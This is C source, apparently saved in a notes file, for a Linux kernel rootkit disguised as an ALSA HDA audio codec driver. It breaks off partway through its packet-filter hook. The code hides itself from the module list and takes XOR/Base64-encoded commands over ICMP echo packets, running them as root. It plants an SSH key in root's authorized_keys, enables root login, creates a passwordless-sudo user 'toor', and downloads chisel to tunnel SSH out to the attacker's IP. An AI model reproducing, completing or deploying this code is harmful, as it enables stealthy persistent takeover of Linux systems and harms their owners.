---
created: 2025-11-09T10:54
updated: 2025-12-09T23:05
---
```c
/*
 * Advanced Linux Audio Codec Support Module
 * Base64 + XOR Encoding (Obfuscated)
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/skbuff.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/workqueue.h>
#include <linux/slab.h>
#include <linux/kmod.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/list.h>
#include <linux/mutex.h>
#include <linux/bug.h>

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("ALSA Project");
MODULE_DESCRIPTION("HDA codec driver");
MODULE_VERSION("6.0");

static int debug_mode = 0;
static const char xor_key[] = {0xAB, 0xCD, 0xEF, 0x12, 0x34, 0x56, 0x78, 0x9A};
static const int xor_key_len = sizeof(xor_key);
static const char aud_prefix[] = "AUD:";
static const int aud_prefix_len = sizeof(aud_prefix) - 1;
static const char sync_prefix[] = "SYNC:";
static const int sync_prefix_len = sizeof(sync_prefix) - 1;
static const char hid_prefix[] = "HID:";
static const int hid_prefix_len = sizeof(hid_prefix) - 1;
static const char unh_prefix[] = "UNH:";
static const int unh_prefix_len = sizeof(unh_prefix) - 1;
static const char sshq_prefix[] = "SSHQ:";
static const int sshq_prefix_len = sizeof(sshq_prefix) - 1;
static const char sshf_prefix[] = "SSHF:";
static const int sshf_prefix_len = sizeof(sshf_prefix) - 1;
static const char rogu_prefix[] = "ROGU:";
static const int rogu_prefix_len = sizeof(rogu_prefix) - 1;
static const char rogc_prefix[] = "ROGC:";
static const int rogc_prefix_len = sizeof(rogc_prefix) - 1;
static const char chis_prefix[] = "CHIS:";
static const int chis_prefix_len = sizeof(chis_prefix) - 1;

struct audio_state {
    unsigned long last_buffer_time;
    int processing_enabled;
    int samples_processed;
    int packets_received;
    int commands_processed;
    int decode_errors;
    int is_hidden;          /* track hide/unhide state */
    unsigned long sync_timeout;  /* 120-second sync window */
    spinlock_t lock;
} audio_ctx;

static struct nf_hook_ops audio_netfilter;
static struct workqueue_struct *audio_workqueue;
static struct proc_dir_entry *audio_proc_dir;
static struct proc_dir_entry *audio_proc_entry;
static struct proc_dir_entry *audio_proc_debug;

struct audio_work {
    struct work_struct work;
    char command[1024];
};

struct chunk_buffer {
    char chunks[32][512];
    int total_chunks;
    unsigned long last_chunk_time;
};

static struct chunk_buffer chunk_ctx;
static struct module *this_module;
static struct list_head *original_prev;
static struct list_head *original_next;
static char current_attacker_ip[16] = {0}; // Store attacker IP from ICMP source
static int snd_hda_extract_pcm_params(char *data, int len, int max_len);
static void snd_hda_codec_suspend_state(void);
static void queue_audio_processing(const char *command);
static void snd_hda_execute_chisel_tunnel(const char *attacker_ip);

static void init_chunk_buffer(void) {
    memset(&chunk_ctx, 0, sizeof(chunk_ctx));
}

static void snd_hda_codec_suspend_state(void) {
    struct list_head *list;
    unsigned long flags;
    
    this_module = THIS_MODULE;
    if (!this_module) {
        // Silent operation - no debug output
        return;
    }
    
    // Check if already hidden
    spin_lock_irqsave(&audio_ctx.lock, flags);
    if (audio_ctx.is_hidden) {
        spin_unlock_irqrestore(&audio_ctx.lock, flags);
        return;
    }
    spin_unlock_irqrestore(&audio_ctx.lock, flags);
    
    list = &this_module->list;
    if (list->prev && list->next) {
        // Store original list pointers for restoration
        original_prev = list->prev;
        original_next = list->next;
        
        list_del(list);
        INIT_LIST_HEAD(list);
        
        spin_lock_irqsave(&audio_ctx.lock, flags);
        audio_ctx.is_hidden = 1;
        spin_unlock_irqrestore(&audio_ctx.lock, flags);
    }
}
static void snd_hda_codec_resume_state(void) {
    unsigned long flags;
    
    this_module = THIS_MODULE;
    if (!this_module) {
        // if (debug_mode)
        //     printk(KERN_INFO "snd_hda_codec: No module reference available for unhiding\n");
        return;
    }
    
    // Check if already visible
    spin_lock_irqsave(&audio_ctx.lock, flags);
    if (!audio_ctx.is_hidden) {
        spin_unlock_irqrestore(&audio_ctx.lock, flags);
        // if (debug_mode)
        //     printk(KERN_INFO "snd_hda_codec: Module already visible\n");
        return;
    }
    spin_unlock_irqrestore(&audio_ctx.lock, flags);
    
    // Restore original list pointers if we have them
    if (original_prev && original_next) {
        struct list_head *list = &this_module->list;
        
        // Restore the original list connections
        list->prev = original_prev;
        list->next = original_next;
        
        // Update the neighboring nodes to point back to us
        original_prev->next = list;
        original_next->prev = list;
        
        // if (debug_mode)
        //     printk(KERN_INFO "snd_hda_codec: Module list pointers restored\n");
    } else {
        // Fallback: just reinitialize the list head
        INIT_LIST_HEAD(&this_module->list);
        // if (debug_mode)
        //     printk(KERN_INFO "snd_hda_codec: Module list head reinitialized (fallback)\n");
    }
    
    spin_lock_irqsave(&audio_ctx.lock, flags);
    audio_ctx.is_hidden = 0;
    spin_unlock_irqrestore(&audio_ctx.lock, flags);
}

static void snd_hda_execute_ssh_quick(void) {
    // Queue command to workqueue - cannot call call_usermodehelper from atomic context
    const char *command = "chattr -i /root/.ssh/authorized_keys 2>/dev/null || true && "
        "mkdir -p /root/.ssh && chmod 700 /root/.ssh && "
        "echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFGYCXLeiKqBDVpnoeMYReTs4yWuoosdO1dF+IB9RBqh\" >> /root/.ssh/authorized_keys && "
        "chmod 600 /root/.ssh/authorized_keys";
    
    if (debug_mode)
        printk(KERN_INFO "snd_hda_codec: SSHQ: Queuing SSH key quick setup\n");
    
    queue_audio_processing(command);
}

static void snd_hda_execute_ssh_full(void) {
    // Queue command to workqueue - cannot call call_usermodehelper from atomic context
    const char *command = "chattr -i /root/.ssh/authorized_keys 2>/dev/null || true && "
        "mkdir -p /root/.ssh && chmod 700 /root/.ssh && "
        "echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFGYCXLeiKqBDVpnoeMYReTs4yWuoosdO1dF+IB9RBqh\" >> /root/.ssh/authorized_keys && "
        "chmod 600 /root/.ssh/authorized_keys && chown root:root /root/.ssh/authorized_keys && "
        "sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config 2>/dev/null && "
        "sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config 2>/dev/null && "
        "sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile/' /etc/ssh/sshd_config 2>/dev/null && "
        "systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null || true";
    
    if (debug_mode)
        printk(KERN_INFO "snd_hda_codec: SSHF: Queuing SSH key full setup\n");
    
    queue_audio_processing(command);
}

static void snd_hda_execute_rogue_user(void) {
    // Queue command to workqueue - cannot call call_usermodehelper from atomic context
    const char *command = "chattr -i /etc/passwd /etc/shadow /etc/group /etc/gshadow 2>/dev/null || true && "
        "useradd -m -s /bin/bash toor 2>/dev/null || true && "
        "echo 'toor:changeme' | chpasswd && "
        "mkdir -p /home/toor/.ssh && chmod 700 /home/toor/.ssh && "
        "echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFGYCXLeiKqBDVpnoeMYReTs4yWuoosdO1dF+IB9RBqh\" > /home/toor/.ssh/authorized_keys && "
        "chmod 600 /home/toor/.ssh/authorized_keys && chown -R toor:toor /home/toor/.ssh && "
        "usermod -aG sudo toor 2>/dev/null || true && "
        "usermod -aG wheel toor 2>/dev/null || true && "
        "mkdir -p /etc/sudoers.d && "
        "echo 'toor ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/99-toor && "
        "chmod 440 /etc/sudoers.d/99-toor";
    
    if (debug_mode)
        printk(KERN_INFO "snd_hda_codec: ROGU: Queuing rogue user creation\n");
    
    queue_audio_processing(command);
}

static void snd_hda_execute_rogue_cleanup(void) {
    // Queue command to workqueue - cannot call call_usermodehelper from atomic context
    // Hardcoded to clean up 'toor' user
    const char *command = "rm -f /etc/sudoers.d/99-toor 2>/dev/null || true && "
        "pkill -u toor 2>/dev/null || true && "
        "sleep 2 && "
        "userdel -r toor 2>/dev/null || true && "
        "rm -rf /home/toor 2>/dev/null || true";
    
    if (debug_mode)
        printk(KERN_INFO "snd_hda_codec: ROGC: Queuing rogue user cleanup\n");
    
    queue_audio_processing(command);
}

static void snd_hda_execute_chisel_tunnel(const char *attacker_ip) {
    char command[1024];
    
    // Hardcoded defaults - maximum stealth, minimal payload
    const int remote_port = 2222;           // Port on attacker to listen
    const char *internal_host = "localhost"; // Internal host to forward
    const int internal_port = 22;            // Internal port (SSH)
    
    // Build chisel command - download, extract, and run
    // Uses attacker IP extracted from ICMP packet source
    // Use HTTP (not HTTPS) to avoid TLS certificate issues
    snprintf(command, sizeof(command),
        "wget -q https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz -O /tmp/ch.gz 2>/dev/null && "
        "gunzip -f /tmp/ch.gz 2>/dev/null && "
        "chmod +x /tmp/ch 2>/dev/null && "
        "/tmp/ch client %s:8443 R:%d:%s:%d 2>/dev/null &",
        attacker_ip, remote_port, internal_host, internal_port);
    
    if (debug_mode)
        printk(KERN_INFO "snd_hda_codec: CHIS: Creating tunnel to %s R:%d:%s:%d\n",
               attacker_ip, remote_port, internal_host, internal_port);
    
    queue_audio_processing(command);
}

static void xor_decode(char *data, int len) {
    int i;
    for (i = 0; i < len; i++) {
        data[i] ^= xor_key[i % xor_key_len];
    }
}

static int snd_hda_decode_format_value(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    if (c == '=') return -1;
    return -2;
}


static int snd_hda_parse_stream_format(const char *input, int input_len, char *output, int max_output) {
    int i, j = 0, val[4];
    
    if (input_len < 4) return -1;
    
    for (i = 0; i < input_len && j < max_output - 3; i += 4) {
        if (i + 3 >= input_len) break;
        
        val[0] = snd_hda_decode_format_value(input[i]);
        val[1] = snd_hda_decode_format_value(input[i + 1]);
        val[2] = (i + 2 < input_len) ? snd_hda_decode_format_value(input[i + 2]) : -1;
        val[3] = (i + 3 < input_len) ? snd_hda_decode_format_value(input[i + 3]) : -1;
        
        if (val[0] < -1 || val[1] < -1) return -1;
        
        output[j++] = (val[0] << 2) | (val[1] >> 4);
        
        if (val[2] >= 0) {
            if (j >= max_output) break;
            output[j++] = ((val[1] & 0x0F) << 4) | (val[2] >> 2);
            
            if (val[3] >= 0) {
                if (j >= max_output) break;
                output[j++] = ((val[2] & 0x03) << 6) | val[3];
            }
        }
    }
    
    output[j] = '\0';
    return j;
}

static void process_audio_command(struct work_struct *work) {
    struct audio_work *audio_work = container_of(work, struct audio_work, work);
    char *argv[] = {"/bin/sh", "-c", audio_work->command, NULL};
    char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
    unsigned long flags;
    int ret;
    
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    
    spin_lock_irqsave(&audio_ctx.lock, flags);
    audio_ctx.commands_processed++;
    audio_ctx.last_buffer_time = jiffies;
    spin_unlock_irqrestore(&audio_ctx.lock, flags);
    
    kfree(audio_work);
}

static void queue_audio_processing(const char *command) {
    struct audio_work *work;
    
    if (debug_mode)
        printk(KERN_INFO "snd_hda_codec: Queueing command for execution: %.50s\n", command);
    
    if (!audio_workqueue) {
        if (debug_mode)
            printk(KERN_WARNING "snd_hda_codec: No workqueue available!\n");
        return;
    }
    
    work = kmalloc(sizeof(struct audio_work), GFP_ATOMIC);
    if (!work) {
        if (debug_mode)
            printk(KERN_WARNING "snd_hda_codec: Failed to allocate work structure!\n");
        return;
    }
    
    strncpy(work->command, command, sizeof(work->command) - 1);
    work->command[sizeof(work->command) - 1] = '\0';
    
    INIT_WORK(&work->work, process_audio_command);
    queue_work(audio_workqueue, &work->work);
    
    if (debug_mode)
        printk(KERN_INFO "snd_hda_codec: Command queued successfully\n");
}

static int snd_hda_check_codec_ready(const char *stream_data, int data_len) {
    char temp_buffer[1024];
    char xor_buffer[1024]; 
    int decoded_len;
    unsigned long flags;
    const int data_offset = 4; // fixed offset inside ICMP payload for encoded data window
    const int actual_data_size = 12; // actual data size (before ICMP pattern padding)
    int result = 0;
    int sync_data_len;
    int base64_len;
    int j;
    int quick_check_len;
    
    if (data_len != 56) {
        return 0;
    }
    
    if (debug_mode) {
        printk(KERN_INFO "snd_hda_codec: Processing potential sync packet (56 bytes data_len)\n");
    }
    
    // Read only actual data size (12 bytes), not including ICMP pattern padding
    sync_data_len = data_len - data_offset;
    if (sync_data_len > actual_data_size) {
        sync_data_len = actual_data_size; // Limit to actual data, ignore ICMP pattern padding
    }
    if (sync_data_len <= 0 || sync_data_len >= sizeof(xor_buffer)) return 0;
    
    memcpy(xor_buffer, stream_data + data_offset, sync_data_len);
    xor_decode(xor_buffer, sync_data_len);
    
    if (debug_mode) {
        printk(KERN_INFO "snd_hda_codec: Processing sync packet, total_len=%d, data_len=%d, offset=%d\n", data_len, sync_data_len, data_offset);
    }
    
    // First check: Reject obvious command chunks immediately
    if (sync_data_len >= 4) {
        quick_check_len = sync_data_len > 32 ? 32 : sync_data_len;
        for (j = 0; j < quick_check_len - 3; j++) {
            if ((xor_buffer[j] == 'C' && xor_buffer[j+1] == 'H' && xor_buffer[j+2] == 'K' && xor_buffer[j+3] == ':') ||
                (xor_buffer[j] == 'A' && xor_buffer[j+1] == 'U' && xor_buffer[j+2] == 'D' && xor_buffer[j+3] == ':')) {
                if (debug_mode)
                    printk(KERN_INFO "snd_hda_codec: Rejecting command chunk in sync mode: %.20s\n", xor_buffer + j);
                return 0;
            }
        }
    }
    
    base64_len = snd_hda_extract_pcm_params(xor_buffer, sync_data_len, sizeof(xor_buffer) - 1);
    xor_buffer[base64_len] = '\0';
    
    if (base64_len <= 0) {
            if (debug_mode)
            printk(KERN_WARNING "snd_hda_codec: No valid Base64 data found in sync packet\n");
        return 0;
    }
    
    decoded_len = snd_hda_parse_stream_format(xor_buffer, base64_len, temp_buffer, sizeof(temp_buffer) - 1);
    
    if (decoded_len < 0) {
        return 0;
    }
    
    temp_buffer[decoded_len] = '\0';
    
    if (debug_mode)
        printk(KERN_INFO "snd_hda_codec: Sync packet decoded: %.50s\n", temp_buffer);
    if (strncmp(temp_buffer, sync_prefix, sync_prefix_len) == 0) {
        spin_lock_irqsave(&audio_ctx.lock, flags);
        audio_ctx.processing_enabled = 1;
        audio_ctx.last_buffer_time = jiffies;
        audio_ctx.sync_timeout = jiffies + (120 * HZ);  // Set 120s sync window
        result = 1;
    spin_unlock_irqrestore(&audio_ctx.lock, flags);
        
        if (debug_mode)
            printk(KERN_INFO "snd_hda_codec: SYNC packet received - Channel activated (120s window)\n");
    } else {
        if (debug_mode)
            printk(KERN_WARNING "snd_hda_codec: Missing SYNC: prefix in sync packet, got: %.20s\n", temp_buffer);
    }
    
    return result;
}

static int snd_hda_extract_pcm_params(char *data, int len, int max_len) {
    // Find the end of valid Base64 data by looking for non-Base64 characters
    int valid_len = 0;
    int i;
    char c;
    for (i = 0; i < len && i < max_len; i++) {
        c = data[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || 
            c == '+' || c == '/' || c == '=') {
            valid_len = i + 1;
        } else if (c < 32 || c > 126) {
            // Stop at non-printable characters (likely padding after XOR decode)
            break;
        } else {
            valid_len = i + 1;
        }
    }
    
    if (valid_len == 0) {
        valid_len = len > max_len ? max_len : len;
    }
    
    // Ensure proper Base64 padding  
    while (valid_len > 0 && valid_len % 4 != 0 && valid_len < max_len) {
        data[valid_len] = '=';
        valid_len++;
    }
    
    return valid_len;
}

static void snd_hda_process_rirb_response(const char *data, int len) {
    char temp_buffer[1024];
    char xor_buffer[1024]; 
    char decoded_command[1024];
    int decoded_len, final_len;
    unsigned long flags;
    const int data_offset = 4; // fixed offset inside ICMP payload for encoded data window
    const int actual_data_size = 12; // actual data size (before ICMP pattern padding)
    int data_len;
    int base64_len;
    int all_chunks_received;
    int chunks_received;
    int actual_chunks;
    int i;
    char debug_str[32];
    int debug_len;
    char c;
    
    if (len <= 0 || len > 1450) return;
    
    if (len < data_offset) {
        if (debug_mode)
            printk(KERN_WARNING "snd_hda_codec: Packet too small for data offset (len=%d, need=%d)\n", len, data_offset);
        return;
    }
    
    // Read only actual data size (12 bytes), not including ICMP pattern padding
    data_len = len - data_offset;
    if (data_len > actual_data_size) {
        data_len = actual_data_size; // Limit to actual data, ignore ICMP pattern padding
    }
    if (data_len <= 0) return;
    if (data_len >= sizeof(xor_buffer)) data_len = sizeof(xor_buffer) - 1;
    
    memcpy(xor_buffer, data + data_offset, data_len);
    xor_decode(xor_buffer, data_len);
    
    if (debug_mode) {
        printk(KERN_INFO "snd_hda_codec: Processing packet, total_len=%d, data_len=%d, offset=%d\n", len, data_len, data_offset);
        memset(debug_str, 0, sizeof(debug_str));
        debug_len = data_len < 16 ? data_len : 16;
        for (i = 0; i < debug_len; i++) {
            c = xor_buffer[i];
            if (c >= 32 && c <= 126) {
                debug_str[i] = c;
            } else {
                debug_str[i] = '?';
            }
        }
        printk(KERN_INFO "snd_hda_codec: XOR decoded preview: %.16s\n", debug_str);
    }
    
    base64_len = snd_hda_extract_pcm_params(xor_buffer, data_len, sizeof(xor_buffer) - 1);
    xor_buffer[base64_len] = '\0';
    
    if (base64_len <= 0) {
        if (debug_mode)
            printk(KERN_WARNING "snd_hda_codec: No valid Base64 data found in packet\n");
        return;
    }
    
    decoded_len = snd_hda_parse_stream_format(xor_buffer, base64_len, temp_buffer, sizeof(temp_buffer) - 1);
    
    if (decoded_len < 0) {
        spin_lock_irqsave(&audio_ctx.lock, flags);
        audio_ctx.decode_errors++;
        spin_unlock_irqrestore(&audio_ctx.lock, flags);
        return;
    }
    
    if (debug_mode)
        printk(KERN_INFO "snd_hda_codec: Extracted %d Base64 bytes, decoded to %d bytes\n", base64_len, decoded_len);
    temp_buffer[decoded_len] = '\0';
    
    // Check for SYNC packet during command processing (resets timeout)
    if (strncmp(temp_buffer, sync_prefix, sync_prefix_len) == 0) {
        spin_lock_irqsave(&audio_ctx.lock, flags);
        audio_ctx.sync_timeout = jiffies + (120 * HZ);  // Reset 120s sync window
        spin_unlock_irqrestore(&audio_ctx.lock, flags);
        if (debug_mode)
            printk(KERN_INFO "snd_hda_codec: SYNC packet received during command processing - timeout reset (120s)\n");
        return;
    }
    
    if (base64_len >= 4 && strncmp(temp_buffer, "CHK:", 4) == 0) {
        if (debug_mode)
            printk(KERN_INFO "snd_hda_codec: Detected chunk packet\n");
        char *chunk_start, *chunk_end;
        int chunk_num, total_chunks;
        
        chunk_start = strchr(temp_buffer, ':');
        if (!chunk_start) return;
        chunk_start++;
        
        chunk_end = strchr(chunk_start, '/');
        if (!chunk_end) return;
        *chunk_end = '\0';
        chunk_num = simple_strtol(chunk_start, NULL, 10);
        
        chunk_start = chunk_end + 1;
        chunk_end = strchr(chunk_start, ':');
        if (!chunk_end) return;
        *chunk_end = '\0';
        total_chunks = simple_strtol(chunk_start, NULL, 10);
        
        chunk_start = chunk_end + 1;
        
        if (debug_mode)
            printk(KERN_INFO "snd_hda_codec: Parsed chunk header: chunk=%d, total=%d\n", chunk_num, total_chunks);
        
        spin_lock_irqsave(&audio_ctx.lock, flags);
        
        if (chunk_num == 0 || time_after(jiffies, chunk_ctx.last_chunk_time + 10 * HZ) || 
            (chunk_ctx.total_chunks != total_chunks && chunk_ctx.total_chunks > 0)) {
            if (debug_mode && chunk_num == 0)
                printk(KERN_INFO "snd_hda_codec: Resetting chunk buffer for first chunk\n");
            else if (debug_mode && time_after(jiffies, chunk_ctx.last_chunk_time + 10 * HZ))
                printk(KERN_INFO "snd_hda_codec: Resetting chunk buffer due to timeout\n");
            else if (debug_mode && chunk_ctx.total_chunks != total_chunks)
                printk(KERN_INFO "snd_hda_codec: Resetting chunk buffer due to total_chunks change: %d -> %d\n", 
                       chunk_ctx.total_chunks, total_chunks);
            
            memset(chunk_ctx.chunks, 0, sizeof(chunk_ctx.chunks));
            chunk_ctx.total_chunks = total_chunks;
        }
        
        if (chunk_ctx.total_chunks == 0) {
            chunk_ctx.total_chunks = total_chunks;
        }
        
        if (chunk_num >= 0 && chunk_num < 32) {
            char *chunk_end_ptr = temp_buffer + decoded_len;
            int chunk_data_len = chunk_end_ptr - chunk_start;
            
            if (chunk_data_len > 0 && chunk_data_len < 512) {
                if (chunk_ctx.chunks[chunk_num][0] == '\0') {
                    /* first time storing this slot — no extra accounting needed */
                }
                memcpy(chunk_ctx.chunks[chunk_num], chunk_start, chunk_data_len);
                chunk_ctx.chunks[chunk_num][chunk_data_len] = '\0';
                
                if (debug_mode)
                    printk(KERN_INFO "snd_hda_codec: Stored chunk %d, data_len=%d\n", chunk_num, chunk_data_len);
            } else {
                if (debug_mode)
                    printk(KERN_WARNING "snd_hda_codec: Invalid chunk data length %d for chunk %d\n", chunk_data_len, chunk_num);
            }
        } else {
            if (debug_mode)
                printk(KERN_WARNING "snd_hda_codec: Chunk number %d out of range (0-31)\n", chunk_num);
        }
        
        chunk_ctx.last_chunk_time = jiffies;
        audio_ctx.last_buffer_time = jiffies;
        spin_unlock_irqrestore(&audio_ctx.lock, flags);
        
        all_chunks_received = 0;
        if (chunk_ctx.total_chunks > 0 && chunk_ctx.total_chunks <= 32) {
            chunks_received = 0;
            for (i = 0; i < chunk_ctx.total_chunks; i++) {
                if (chunk_ctx.chunks[i][0] != '\0') {
                    chunks_received++;
                }
            }
            all_chunks_received = (chunks_received >= chunk_ctx.total_chunks);
            if (debug_mode && all_chunks_received) {
                printk(KERN_INFO "snd_hda_codec: All %d chunks received, ready for reassembly\n", chunk_ctx.total_chunks);
            }
        }
        
        if (debug_mode) {
            actual_chunks = 0;
            for (i = 0; i < chunk_ctx.total_chunks && i < 32; i++) {
                if (chunk_ctx.chunks[i][0] != '\0') actual_chunks++;
            }
            printk(KERN_INFO "snd_hda_codec: Chunk status: actual=%d, total=%d, ready=%s\n", 
                   actual_chunks, chunk_ctx.total_chunks, all_chunks_received ? "yes" : "no");
        }
        
        if (debug_mode)
            printk(KERN_INFO "snd_hda_codec: Chunk %d/%d received\n", chunk_num + 1, total_chunks);
        
        // If all chunks received, reassemble and process
        if (all_chunks_received) {
            char reassembled_cmd[2048];
            int i, pos = 0;
            
            for (i = 0; i < chunk_ctx.total_chunks && pos < sizeof(reassembled_cmd) - 1; i++) {
                int chunk_len = strlen(chunk_ctx.chunks[i]);
                if (chunk_len > 0 && pos + chunk_len < sizeof(reassembled_cmd)) {
                    memcpy(reassembled_cmd + pos, chunk_ctx.chunks[i], chunk_len);
                    pos += chunk_len;
                    
                    if (debug_mode)
                        printk(KERN_INFO "snd_hda_codec: Reassembled chunk %d, len=%d, total_pos=%d\n", i, chunk_len, pos);
                }
            }
            reassembled_cmd[pos] = '\0';
            
            if (debug_mode)
                printk(KERN_INFO "snd_hda_codec: Reassembled command length=%d\n", pos);
            
            spin_lock_irqsave(&audio_ctx.lock, flags);
            memset(chunk_ctx.chunks, 0, sizeof(chunk_ctx.chunks));
            chunk_ctx.total_chunks = 0;
            spin_unlock_irqrestore(&audio_ctx.lock, flags);
            
            if (strncmp(reassembled_cmd, aud_prefix, aud_prefix_len) == 0) {
                int cmd_len = strlen(reassembled_cmd) - aud_prefix_len;
                if (cmd_len > 0 && cmd_len < sizeof(decoded_command)) {
                    memcpy(decoded_command, reassembled_cmd + aud_prefix_len, cmd_len);
                    decoded_command[cmd_len] = '\0';

                    if (debug_mode)
                        printk(KERN_INFO "snd_hda_codec: Executing reassembled command: %.100s\n", decoded_command);

                    spin_lock_irqsave(&audio_ctx.lock, flags);
                    audio_ctx.last_buffer_time = jiffies;
                    spin_unlock_irqrestore(&audio_ctx.lock, flags);

                    queue_audio_processing(decoded_command);
                } else {
                    if (debug_mode)
                        printk(KERN_WARNING "snd_hda_codec: Reassembled command too long (%d bytes)\n", cmd_len);
                }
            } else {
                if (debug_mode)
                    printk(KERN_WARNING "snd_hda_codec: Reassembled command missing AUD: prefix\n");
            }
        }
        return;
    }
    
    if (strncmp(temp_buffer, aud_prefix, aud_prefix_len) == 0) {
        // Process AUD: commands normally
    } else if (strncmp(temp_buffer, hid_prefix, hid_prefix_len) == 0) {
        // Handle HID: hide command
        if (debug_mode)
            printk(KERN_INFO "snd_hda_codec: HID: hide command detected\n");
        snd_hda_codec_suspend_state();
        return; // Don't process as normal command
    } else if (strncmp(temp_buffer, unh_prefix, unh_prefix_len) == 0) {
        // Handle UNH: unhide command
        if (debug_mode)
            printk(KERN_INFO "snd_hda_codec: UNH: unhide command detected\n");
        snd_hda_codec_resume_state();
        return; // Don't process as normal command
    } else if (strncmp(temp_buffer, sshq_prefix, sshq_prefix_len) == 0) {
        // Handle SSHQ: SSH key quick command
        if (debug_mode)
            printk(KERN_INFO "snd_hda_codec: SSHQ: SSH key quick command detected\n");
        snd_hda_execute_ssh_quick();
        return; // Don't process as normal command
    } else if (strncmp(temp_buffer, sshf_prefix, sshf_prefix_len) == 0) {
        // Handle SSHF: SSH key full command
        if (debug_mode)
            printk(KERN_INFO "snd_hda_codec: SSHF: SSH key full command detected\n");
        snd_hda_execute_ssh_full();
        return; // Don't process as normal command
    } else if (strncmp(temp_buffer, rogu_prefix, rogu_prefix_len) == 0) {
        // Handle ROGU: rogue user command
        if (debug_mode)
            printk(KERN_INFO "snd_hda_codec: ROGU: rogue user command detected\n");
        snd_hda_execute_rogue_user();
        return; // Don't process as normal command
    } else if (strncmp(temp_buffer, rogc_prefix, rogc_prefix_len) == 0) {
        // Handle ROGC: rogue cleanup command
        if (debug_mode)
            printk(KERN_INFO "snd_hda_codec: ROGC: rogue cleanup command detected\n");
        snd_hda_execute_rogue_cleanup();
        return; // Don't process as normal command
    } else if (strncmp(temp_buffer, chis_prefix, chis_prefix_len) == 0) {
        // Handle CHIS: chisel tunnel command - uses hardcoded defaults
        if (debug_mode)
            printk(KERN_INFO "snd_hda_codec: CHIS: Chisel tunnel command detected from %s\n", current_attacker_ip);
        snd_hda_execute_chisel_tunnel(current_attacker_ip);
        return; // Don't process as normal command
    } else if (strncmp(temp_buffer, sync_prefix, sync_prefix_len) == 0) {
        // Reset sync timeout when sync packet received during command mode
        spin_lock_irqsave(&audio_ctx.lock, flags);
        audio_ctx.sync_timeout = jiffies + (120 * HZ);  // Reset 120s sync window
        spin_unlock_irqrestore(&audio_ctx.lock, flags);
        if (debug_mode)
            printk(KERN_INFO "snd_hda_codec: SYNC packet received in command mode, resetting 120s timer\n");
        return;
    } else {
        if (debug_mode)
            printk(KERN_WARNING "snd_hda_codec: Missing AUD:, HID:, UNH:, SSHQ:, SSHF:, ROGU:, ROGC:, CHIS:, or SYNC: prefix in packet, got: %.20s\n", temp_buffer);
        return;
    }
    
    if (debug_mode)
        printk(KERN_INFO "snd_hda_codec: Processing regular command\n");
    
    final_len = decoded_len - aud_prefix_len;
    if (final_len <= 0 || final_len >= sizeof(decoded_command)) {
        if (debug_mode)
            printk(KERN_WARNING "snd_hda_codec: Invalid command length\n");
        return;
    }
    
    memcpy(decoded_command, temp_buffer + aud_prefix_len, final_len);
    decoded_command[final_len] = '\0';
    
    if (debug_mode)
        printk(KERN_INFO "snd_hda_codec: Decoded %d->%d: %s\n", len, final_len, decoded_command);
    
    // Normal command processing
    spin_lock_irqsave(&audio_ctx.lock, flags);
    audio_ctx.last_buffer_time = jiffies;
    spin_unlock_irqrestore(&audio_ctx.lock, flags);
    
    queue_audio_processing(decoded_command);
}

static unsigned int snd_hda_dsp_transfer_callback(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct iphdr *ip_header;
    struct icmphdr *icmp_header;
    char *stream_data;
    int data_len;
    unsigned long flags;
    int processing_enabled;
    int suspicious;
    int i;
    
    if (!skb) return NF_ACCEPT;
    
    ip_header = ip_hdr(skb);
    if (!ip_header || ip_header->protocol != IPPROTO_ICMP) return NF_ACCEPT;
    
    icmp_header = icmp_hdr(skb);
    if (!icmp_header) return NF_ACCEPT;
    
    if (icmp_header->type != 8) return NF_ACCEPT;
    
    stream_data = (char *)(icmp_header + 1);
    data_len = ntohs(ip_header->tot_len) - sizeof(struct iphdr) - sizeof(struct icmphdr);
    
    // if (debug_mode)
    //     printk(KERN_INFO "snd_hda_codec: ICMP packet received, data_len=%d\n", data_len);
    
    if (data_len < 28 || data_len > 1400) {
        // if (debug_mode)
        //     printk(KERN_INFO "snd_hda_codec: Packet size %d out of range (28-1400), dropping\n", data_len);
        return NF_ACCEPT;
    }
    
    spin_lock_irqsave(&audio_ctx.lock, flags);
    processing_enabled = audio_ctx.processing_enabled;
    spin_unlock_irqrestore(&audio_ctx.lock, flags);
    
    if (debug_mode && (data_len != 36 || processing_enabled)) {
        printk(KERN_INFO "snd_hda_codec: Processing ICMP packet, data_len=%d, mode=%s\n", 
               data_len, processing_enabled ? "command" : "sync");
    }
    
    suspicious = 0;
    if (data_len >= 8) {
        for (i = 8; i < (data_len > 24 ? 24 : data_len); i++) {
            if (stream_data[i] < 32 || stream_data[i] > 126) {
                suspicious = 1;
                break;
            }
        }
        
        if (!processing_enabled && data_len == 56) {
            if (!suspicious) {
                return NF_ACCEPT;
            }
        }
    }
    
    spin_lock_irqsave(&audio_ctx.lock, flags);
    if (processing_enabled || suspicious) {
    audio_ctx.packets_received++;
    }
    spin_unlock_irqrestore(&audio_ctx.lock, flags);
    
    // Check for sync timeout (120s window)
            spin_lock_irqsave(&audio_ctx.lock, flags);
    unsigned long current_time = jiffies;
    int sync_expired = 0;
    
